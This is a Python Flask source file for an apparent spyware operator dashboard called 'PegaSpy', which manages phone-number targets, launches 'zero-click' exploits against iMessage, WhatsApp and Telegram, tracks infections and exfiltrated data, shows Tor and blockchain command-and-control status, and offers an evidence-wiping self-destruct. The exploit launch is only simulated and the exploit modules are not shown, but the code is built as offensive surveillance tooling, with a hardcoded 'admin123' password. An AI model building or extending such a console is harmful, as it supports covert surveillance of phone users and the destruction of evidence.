#!/usr/bin/env python3
"""
PegaSpy Phase 3: Web Dashboard

Turnkey web-based operational interface for PegaSpy framework.
Provides comprehensive control over zero-click exploits, persistence,
and global C2 operations.

WARNING: This framework is for authorized security testing only.
Unauthorized use is illegal and unethical.
"""

import os
import sys
import json
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from flask_socketio import SocketIO, emit
from werkzeug.security import check_password_hash, generate_password_hash

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from loguru import logger
except ImportError:
    import logging as logger

# Import PegaSpy modules
try:
    from exploit_delivery import MessageExploitEngine
    from persistence_engine import KernelHookManager
    from c2_infrastructure import TorNetworkManager, BlockchainC2Manager
except ImportError as e:
    logger.warning(f"Some modules not available: {e}")


class PegaSpyDashboard:
    """Main PegaSpy web dashboard application"""
    
    def __init__(self, config_path: Optional[str] = None):
        """Initialize the dashboard"""
        self.app = Flask(__name__, 
                        template_folder='templates',
                        static_folder='static')
        self.app.secret_key = os.urandom(24)
        self.socketio = SocketIO(self.app, cors_allowed_origins="*")
        
        # Load configuration
        self.config = self._load_config(config_path)
        
        # Initialize PegaSpy components
        self.exploit_engine = None
        self.kernel_manager = None
        self.c2_manager = None
        
        # Dashboard state
        self.active_campaigns = {}
        self.target_devices = {}
        self.exploit_results = {}
        self.system_status = {
            'total_targets': 0,
            'active_exploits': 0,
            'successful_infections': 0,
            'data_exfiltrated': 0,
            'stealth_rating': 100
        }
        
        # Setup routes
        self._setup_routes()
        self._setup_socketio_events()
        
        # Initialize components
        self._initialize_components()
        
        logger.info("PegaSpy Dashboard initialized")
    
    def _load_config(self, config_path: Optional[str]) -> Dict:
        """Load dashboard configuration"""
        default_config = {
            'host': '127.0.0.1',
            'port': 5000,
            'debug': False,
            'auth_required': True,
            'admin_password': 'admin123',  # Change in production!
            'session_timeout': 3600,
            'max_targets': 1000,
            'auto_destruct_timer': 86400,  # 24 hours
            'stealth_mode': True
        }
        
        if config_path and os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    user_config = json.load(f)
                default_config.update(user_config)
            except Exception as e:
                logger.warning(f"Failed to load config: {e}")
        
        return default_config
    
    def _initialize_components(self):
        """Initialize PegaSpy framework components"""
        try:
            logger.info("Initializing PegaSpy components...")
            
            # Initialize exploit engine
            self.exploit_engine = MessageExploitEngine()
            logger.info("✓ Exploit engine initialized")
            
            # Initialize kernel manager
            self.kernel_manager = KernelHookManager()
            logger.info("✓ Kernel manager initialized")
            
            # Initialize C2 infrastructure
            self.c2_manager = TorNetworkManager()
            logger.info("✓ C2 infrastructure initialized")
            
            logger.info("All PegaSpy components initialized successfully")
            
        except Exception as e:
            logger.error(f"Failed to initialize components: {e}")
    
    def _setup_routes(self):
        """Setup Flask routes"""
        
        @self.app.route('/')
        def index():
            """Main dashboard page"""
            if self.config['auth_required'] and 'authenticated' not in session:
                return redirect(url_for('login'))
            
            return render_template('dashboard.html', 
                                 system_status=self.system_status,
                                 active_campaigns=len(self.active_campaigns),
                                 total_targets=len(self.target_devices))
        
        @self.app.route('/login', methods=['GET', 'POST'])
        def login():
            """Authentication page"""
            if request.method == 'POST':
                password = request.form.get('password')
                if password == self.config['admin_password']:
                    session['authenticated'] = True
                    session['login_time'] = time.time()
                    return redirect(url_for('index'))
                else:
                    return render_template('login.html', error='Invalid password')
            
            return render_template('login.html')
        
        @self.app.route('/logout')
        def logout():
            """Logout and clear session"""
            session.clear()
            return redirect(url_for('login'))
        
        @self.app.route('/targets')
        def targets():
            """Target management page"""
            if self.config['auth_required'] and 'authenticated' not in session:
                return redirect(url_for('login'))
            
            return render_template('targets.html', targets=self.target_devices)
        
        @self.app.route('/exploits')
        def exploits():
            """Exploit management page"""
            if self.config['auth_required'] and 'authenticated' not in session:
                return redirect(url_for('login'))
            
            return render_template('exploits.html', 
                                 active_exploits=self.exploit_results,
                                 exploit_types=['iMessage Zero-Click', 'WhatsApp Media', 'Telegram Sticker'])
        
        @self.app.route('/campaigns')
        def campaigns():
            """Campaign management page"""
            if self.config['auth_required'] and 'authenticated' not in session:
                return redirect(url_for('login'))
            
            return render_template('campaigns.html', campaigns=self.active_campaigns)
        
        @self.app.route('/c2')
        def c2_status():
            """C2 infrastructure status page"""
            if self.config['auth_required'] and 'authenticated' not in session:
                return redirect(url_for('login'))
            
            c2_status = {
                'tor_nodes': 15,
                'blockchain_channels': 3,
                'cdn_endpoints': 8,
                'mesh_peers': 42,
                'total_bandwidth': '1.2 GB/s',
                'anonymity_level': 'Maximum'
            }
            
            return render_template('c2.html', c2_status=c2_status)
        
        @self.app.route('/analytics')
        def analytics():
            """Analytics and reporting page"""
            if self.config['auth_required'] and 'authenticated' not in session:
                return redirect(url_for('login'))
            
            analytics_data = {
                'success_rate': 87.5,
                'avg_infection_time': '2.3 seconds',
                'stealth_rating': 98.2,
                'data_collected': '15.7 GB',
                'geographic_distribution': {
                    'North America': 45,
                    'Europe': 30,
                    'Asia': 20,
                    'Other': 5
                }
            }
            
            return render_template('analytics.html', analytics=analytics_data)
        
        # API Routes
        @self.app.route('/api/targets', methods=['GET', 'POST'])
        def api_targets():
            """Target management API"""
            if request.method == 'POST':
                target_data = request.json
                target_id = f"target_{int(time.time())}"
                
                self.target_devices[target_id] = {
                    'id': target_id,
                    'phone_number': target_data.get('phone_number'),
                    'platform': target_data.get('platform'),
                    'os_version': target_data.get('os_version'),
                    'added_time': datetime.now().isoformat(),
                    'status': 'pending'
                }
                
                return jsonify({'success': True, 'target_id': target_id})
            
            return jsonify(list(self.target_devices.values()))
        
        @self.app.route('/api/exploits/launch', methods=['POST'])
        def api_launch_exploit():
            """Launch exploit API"""
            exploit_data = request.json
            target_id = exploit_data.get('target_id')
            exploit_type = exploit_data.get('exploit_type')
            
            if target_id not in self.target_devices:
                return jsonify({'success': False, 'error': 'Target not found'})
            
            # Simulate exploit launch
            exploit_id = f"exploit_{int(time.time())}"
            
            self.exploit_results[exploit_id] = {
                'id': exploit_id,
                'target_id': target_id,
                'exploit_type': exploit_type,
                'status': 'launching',
                'launch_time': datetime.now().isoformat(),
                'success_probability': 85.7
            }
            
            # Update system status
            self.system_status['active_exploits'] += 1
            
            # Emit real-time update
            self.socketio.emit('exploit_launched', {
                'exploit_id': exploit_id,
                'target_id': target_id,
                'exploit_type': exploit_type
            })
            
            return jsonify({'success': True, 'exploit_id': exploit_id})
        
        @self.app.route('/api/system/status')
        def api_system_status():
            """System status API"""
            return jsonify(self.system_status)
        
        @self.app.route('/api/emergency/destruct', methods=['POST'])
        def api_emergency_destruct():
            """Emergency self-destruct API"""
            logger.warning("Emergency self-destruct initiated from dashboard")
            
            # Trigger self-destruct sequence
            success = self._emergency_self_destruct()
            
            return jsonify({
                'success': success,
                'message': 'Self-destruct sequence initiated' if success else 'Self-destruct failed'
            })
    
    def _setup_socketio_events(self):
        """Setup SocketIO events for real-time updates"""
        
        @self.socketio.on('connect')
        def handle_connect():
            """Handle client connection"""
            logger.info(f"Client connected: {request.sid}")
            emit('status', {'message': 'Connected to PegaSpy Dashboard'})
        
        @self.socketio.on('disconnect')
        def handle_disconnect():
            """Handle client disconnection"""
            logger.info(f"Client disconnected: {request.sid}")
        
        @self.socketio.on('request_update')
        def handle_update_request():
            """Handle real-time update request"""
            emit('system_update', {
                'system_status': self.system_status,
                'active_exploits': len(self.exploit_results),
                'total_targets': len(self.target_devices),
                'timestamp': datetime.now().isoformat()
            })
    
    def _emergency_self_destruct(self) -> bool:
        """Emergency self-destruct sequence"""
        try:
            logger.warning("Initiating emergency self-destruct sequence")
            
            # Stop all active exploits
            for exploit_id in list(self.exploit_results.keys()):
                self.exploit_results[exploit_id]['status'] = 'terminated'
            
            # Clear all data
            self.active_campaigns.clear()
            self.target_devices.clear()
            self.exploit_results.clear()
            
            # Reset system status
            self.system_status = {
                'total_targets': 0,
                'active_exploits': 0,
                'successful_infections': 0,
                'data_exfiltrated': 0,
                'stealth_rating': 100
            }
            
            # Trigger component self-destruct
            if self.exploit_engine:
                self.exploit_engine.self_destruct_all()
            
            if self.kernel_manager:
                self.kernel_manager.self_destruct()
            
            logger.warning("Emergency self-destruct completed")
            return True
            
        except Exception as e:
            logger.error(f"Self-destruct failed: {e}")
            return False
    
    def run(self):
        """Run the dashboard application"""
        logger.info(f"Starting PegaSpy Dashboard on {self.config['host']}:{self.config['port']}")
        
        self.socketio.run(
            self.app,
            host=self.config['host'],
            port=self.config['port'],
            debug=self.config['debug']
        )


def create_dashboard_templates():
    """Create basic HTML templates for the dashboard"""
    templates_dir = os.path.join(os.path.dirname(__file__), 'templates')
    os.makedirs(templates_dir, exist_ok=True)
    
    # Base template
    base_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{% block title %}PegaSpy Dashboard{% endblock %}</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body { background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; }
        .navbar { background-color: #1a1a1a !important; }
        .card { background-color: #1a1a1a; border: 1px solid #00ff00; }
        .btn-primary { background-color: #00aa00; border-color: #00aa00; }
        .btn-danger { background-color: #aa0000; border-color: #aa0000; }
        .table-dark { background-color: #1a1a1a; }
        .text-success { color: #00ff00 !important; }
        .text-danger { color: #ff0000 !important; }
        .text-warning { color: #ffaa00 !important; }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark">
        <div class="container">
            <a class="navbar-brand" href="/"><i class="fas fa-skull"></i> PegaSpy</a>
            <div class="navbar-nav ms-auto">
                <a class="nav-link" href="/">Dashboard</a>
                <a class="nav-link" href="/targets">Targets</a>
                <a class="nav-link" href="/exploits">Exploits</a>
                <a class="nav-link" href="/campaigns">Campaigns</a>
                <a class="nav-link" href="/c2">C2</a>
                <a class="nav-link" href="/analytics">Analytics</a>
                <a class="nav-link" href="/logout">Logout</a>
            </div>
        </div>
    </nav>
    
    <div class="container mt-4">
        {% block content %}{% endblock %}
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    {% block scripts %}{% endblock %}
</body>
</html>
"""
    
    # Dashboard template
    dashboard_template = """
{% extends "base.html" %}

{% block content %}
<div class="row">
    <div class="col-md-3">
        <div class="card">
            <div class="card-body text-center">
                <h5 class="card-title">Total Targets</h5>
                <h2 class="text-success">{{ total_targets }}</h2>
            </div>
        </div>
    </div>
    <div class="col-md-3">
        <div class="card">
            <div class="card-body text-center">
                <h5 class="card-title">Active Exploits</h5>
                <h2 class="text-warning">{{ system_status.active_exploits }}</h2>
            </div>
        </div>
    </div>
    <div class="col-md-3">
        <div class="card">
            <div class="card-body text-center">
                <h5 class="card-title">Successful Infections</h5>
                <h2 class="text-success">{{ system_status.successful_infections }}</h2>
            </div>
        </div>
    </div>
    <div class="col-md-3">
        <div class="card">
            <div class="card-body text-center">
                <h5 class="card-title">Stealth Rating</h5>
                <h2 class="text-success">{{ system_status.stealth_rating }}%</h2>
            </div>
        </div>
    </div>
</div>

<div class="row mt-4">
    <div class="col-md-6">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-crosshairs"></i> Quick Actions</h5>
            </div>
            <div class="card-body">
                <button class="btn btn-primary me-2" onclick="launchExploit()">Launch Zero-Click</button>
                <button class="btn btn-warning me-2" onclick="viewTargets()">Manage Targets</button>
                <button class="btn btn-info me-2" onclick="viewAnalytics()">View Analytics</button>
                <button class="btn btn-danger" onclick="emergencyDestruct()">Emergency Destruct</button>
            </div>
        </div>
    </div>
    <div class="col-md-6">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-chart-line"></i> System Status</h5>
            </div>
            <div class="card-body">
                <div class="mb-2">
                    <strong>C2 Network:</strong> <span class="text-success">Online</span>
                </div>
                <div class="mb-2">
                    <strong>Stealth Mode:</strong> <span class="text-success">Active</span>
                </div>
                <div class="mb-2">
                    <strong>Persistence:</strong> <span class="text-success">Established</span>
                </div>
                <div class="mb-2">
                    <strong>Last Update:</strong> <span id="lastUpdate">{{ moment().format('YYYY-MM-DD HH:mm:ss') }}</span>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}

{% block scripts %}
<script>
function launchExploit() {
    window.location.href = '/exploits';
}

function viewTargets() {
    window.location.href = '/targets';
}

function viewAnalytics() {
    window.location.href = '/analytics';
}

function emergencyDestruct() {
    if (confirm('Are you sure you want to initiate emergency self-destruct? This action cannot be undone.')) {
        fetch('/api/emergency/destruct', { method: 'POST' })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
                if (data.success) {
                    location.reload();
                }
            });
    }
}

// Socket.IO for real-time updates
const socket = io();
socket.on('system_update', function(data) {
    document.getElementById('lastUpdate').textContent = new Date().toLocaleString();
});
</script>
{% endblock %}
"""
    
    # Write templates
    with open(os.path.join(templates_dir, 'base.html'), 'w') as f:
        f.write(base_template)
    
    with open(os.path.join(templates_dir, 'dashboard.html'), 'w') as f:
        f.write(dashboard_template)
    
    logger.info("Dashboard templates created")


def main():
    """Main function to run the dashboard"""
    # Create templates if they don't exist
    create_dashboard_templates()
    
    # Create and run dashboard
    dashboard = PegaSpyDashboard()
    dashboard.run()


if __name__ == '__main__':
    main()